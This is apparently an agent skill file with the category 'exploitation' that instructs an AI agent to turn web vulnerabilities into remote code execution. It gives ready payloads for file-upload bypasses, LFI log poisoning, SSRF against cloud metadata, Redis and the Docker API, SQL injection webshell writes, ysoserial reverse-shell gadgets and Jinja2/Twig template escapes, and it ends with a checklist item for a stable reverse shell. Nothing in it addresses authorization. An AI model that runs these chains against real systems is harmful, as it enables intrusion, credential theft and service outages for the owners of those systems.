---
name: web-rce-chain
description: Common web-to-RCE exploitation chains and pivoting strategies. Use when you have identified a web vulnerability and need to escalate it to remote code execution.
metadata:
  hermes:
    category: exploitation
    tags: [rce, web, chaining, post-exploitation]
platforms: [linux, macos]
---

# Web-to-RCE Exploitation Chains

## When to Use

Use this skill when you have:
- Identified a web vulnerability (file upload, LFI, SSRF, SQLi, deserialization, etc.)
- Need to chain it into remote code execution
- Want to know the most efficient path from web bug to shell

## Core Chains

### Chain 1: File Upload → RCE

**Prerequisites:** Unrestricted or weakly-restricted file upload endpoint.

**Procedure:**
1. **Fingerprint the stack** — Determine language/framework from error pages, headers, or source clues.
2. **Bypass extension filters:**
   - Double extension: `shell.php.jpg`
   - Null byte (legacy): `shell.php%00.jpg`
   - Case variation: `shell.PHP`, `shell.pHp`
   - Alternate extensions: `.phtml`, `.php3`, `.php4`, `.php5`, `.phar`, `.inc`
   - MIME type forgery: Set `Content-Type: image/jpeg` while uploading PHP.
3. **Bypass content checks:**
   - Magic bytes: prepend `GIF89a;` to PHP payload.
   - Polyglot: create a valid image that contains embedded PHP via metadata/EXIF.
4. **Locate uploaded file:**
   - Common paths: `/uploads/`, `/images/`, `/files/`, `/assets/`
   - Fuzz with dirsearch/ffuf if path is not returned in response.
5. **Execute:** Access the file via direct URL. If parser misconfiguration exists, the PHP executes.

**Verification:**
- `<?php system('id'); ?>` → check for `uid=` in response.
- Upgrade to full reverse shell once confirmed.

---

### Chain 2: LFI → RCE

**Prerequisites:** Local File Inclusion vulnerability with file path control.

**Procedure:**
1. **Confirm LFI:**
   - Basic: `?page=../../../etc/passwd`
   - Wrapper (PHP): `?page=php://filter/read=convert.base64-encode/resource=index.php`
2. **Source code audit:** Extract `index.php`, `config.php`, `routes.php` to find:
   - File upload endpoints (Chain 1)
   - Log paths (`/var/log/apache2/access.log`, `/var/log/nginx/access.log`)
   - Session paths (`/var/lib/php/sessions/`)
   - Temp paths (`/tmp/`, `/var/tmp/`)
3. **Log Poisoning:**
   - Poison access log with PHP payload in User-Agent: `<?php system($_GET['c']); ?>`
   - Include log file via LFI: `?page=../../../var/log/apache2/access.log&c=id`
4. **Session Poisoning:**
   - If session data is user-controlled (e.g., username stored in session), inject payload.
   - Include session file: `?page=../../../var/lib/php/sessions/sess_<sessionid>`
5. **PHP wrappers:**
   - `php://input` with POST body containing PHP (if `allow_url_include=On`)
   - `data://text/plain;base64,<?php system('id'); ?>` (base64 encoded)

**Verification:**
- Source code extraction confirms parser behavior.
- Log/session inclusion returns command output.

---

### Chain 3: SSRF → Internal Service RCE

**Prerequisites:** SSRF vulnerability allowing internal network requests.

**Procedure:**
1. **Map internal services:**
   - Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP)
   - Internal APIs: `http://localhost:8080/`, `http://127.0.0.1:3000/`
   - Service discovery: Scan common ports via SSRF (6379 Redis, 9200 Elasticsearch, 3306 MySQL)
2. **Redis SSRF → RCE:**
   - Use gopher:// protocol to send raw Redis commands.
   - Write SSH key or webshell via Redis `CONFIG SET dir` + `SAVE`.
   - Reference: `references/redis-ssrf-payloads.txt`
3. **Elasticsearch:**
   - `_search` API to extract data.
   - Historical RCE via scripting (check version for known CVEs).
4. **Docker API:**
   - `http://localhost:2375/containers/json` — list containers.
   - `http://localhost:2375/containers/<id>/exec` — execute commands in containers.

**Verification:**
- Internal service response confirms SSRF reachability.
- Redis/elasticsearch command output confirms RCE.

---

### Chain 4: SQLi → File Write → RCE

**Prerequisites:** MySQL/MariaDB SQLi with `FILE` privilege and writable web root.

**Procedure:**
1. **Confirm SQLi and privileges:**
   ```sql
   SELECT user(), @@secure_file_priv
   ```
2. **Write webshell:**
   ```sql
   SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
   ```
3. **Alternative — dump to log/general_log:**
   ```sql
   SET global general_log = 'ON';
   SET global general_log_file = '/var/www/html/shell.php';
   SELECT "<?php system('id'); ?>";
   ```
4. **Access shell:** `http://target/shell.php?c=id`

**Verification:**
- `secure_file_priv` is empty or points to writable directory.
- Web root path is discoverable from source/config/error messages.

---

### Chain 5: Deserialization → RCE

**Prerequisites:** User-controlled deserialization of PHP/Java/Python objects.

**Procedure:**
1. **Identify gadget chains:**
   - PHP: PHPGGC for common frameworks (Laravel, Symfony, Drupal).
   - Java: ysoserial for CommonsCollections, Spring, etc.
   - Python: pickle/ PyYAML/ marshal payloads.
2. **Generate payload:**
   ```bash
   phpggc Laravel/RCE1 system "id" --base64
   java -jar ysoserial.jar CommonsCollections1 "bash -c {echo,...}|{base64,-d}|{bash,-i}"
   ```
3. **Deliver:**
   - POST body, cookie, header, or any parameter that gets unserialized.
   - If base64 encoded, match the application's encoding.

**Verification:**
- DNS callback or time delay confirms execution.
- Direct command output in response for non-blind gadgets.

---

### Chain 6: SSTI → RCE

**Prerequisites:** Server-Side Template Injection with sandbox escape possible.

**Procedure:**
1. **Identify engine:**
   - Jinja2: `{{ 7*7 }}` → 49
   - Twig: `{{ 7*7 }}` → 49 (but `{{ 7*'7' }}` → 49 in Jinja2, error in Twig)
   - Smarty, Velocity, Freemarker, etc.
2. **Jinja2 sandbox escape:**
   ```python
   {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
   {{ ''.__class__.__mro__[1].__subclasses__()[...].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
   ```
3. **Twig:**
   ```twig
   {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
   ```

**Verification:**
- Math probe confirms template engine.
- `id` output confirms sandbox escape.

## Pitfalls

- **WAF bypass fatigue:** If 3 variants fail, switch chain entirely rather than brute-force encoding.
- **Blind RCE without OOB:** Always prepare DNSlog / interactsh / burp collaborator before testing blind payloads.
- **Overwriting critical files:** When using SQLi file write, verify path — wrong path = database crash or service down.
- **Missing cleanup:** Deserialization payloads may corrupt sessions/caches. Test on non-production first.

## Verification Checklist

- [ ] Command output observed in response, DNS callback, or time delay
- [ ] Reverse shell established and stable
- [ ] Proof documented with screenshot or output capture
